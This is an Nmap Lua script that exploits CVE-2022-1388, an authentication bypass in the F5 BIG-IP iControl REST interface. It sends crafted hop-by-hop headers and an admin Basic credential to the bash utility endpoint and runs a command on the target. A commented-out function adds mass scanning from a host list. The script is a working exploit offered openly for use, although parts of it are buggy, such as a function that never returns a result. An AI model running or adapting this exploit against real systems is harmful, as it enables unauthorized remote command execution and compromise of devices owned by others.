local string = require "string"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"
local io = require "io"

local script_name = "CVE-2022-1388"
local script_summary = "F5 BIG-IP iControl REST Auth Bypass RCE"

author = {"Mr Hackux", "Balgo security"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive"}


local function verify_vulnerability(host, port)
   local command = "-c id"
    local vuln_endpoint = "/mgmt/tm/util/bash"
	local opts = {header={}}
opts["header"]["User-Agent"] = 'Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1'
   opts["header"]["Content-Type"] = 'application/json'
    opts["header"]["Connection"] = 'close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host'
    opts["header"]["X-F5-Auth-Token"] = 'anything'
    opts["header"]["Authorization"] = 'Basic YWRtaW46'

   local payload = '{"command": "run", "utilCmdArgs": "'..command..'"}'

	local response = http.post(host, port, vuln_endpoint, opts , nil, payload)

	if response and response.status == 200 and response.body and string.match(response.body, "tm:util:bash:runstate") then
      print(response.status)
		print(response.body)
       print("[+] is vulnerable.\n")
	else
       print(response.status)
		print("[-] is not vulnerable.\n")
	end
end


local function check_multiple_vulnerabilities(file_path, port)
   local filepath = "/sdcard/Nmap/data/f5.txt"
	local file = io.open(file_path, "r")
	if not file then
		print("[-]Failed to open file: " .. file_path)
	end

	for line in file:lines() do
		local success = verify_vulnerability(line, port)
		if success then
			local success_file = io.open("/sdcard/Nmap/data/success.txt", "a+")
			success_file:write(line .. "\n")
			success_file:close()
		end
	end

	file:close()
end

portrule = shortport.http
action = function(host, port)
		verify_vulnerability(host.ip, port.number)	
		--check_multiple_vulnerabilities(filepath, port)
end
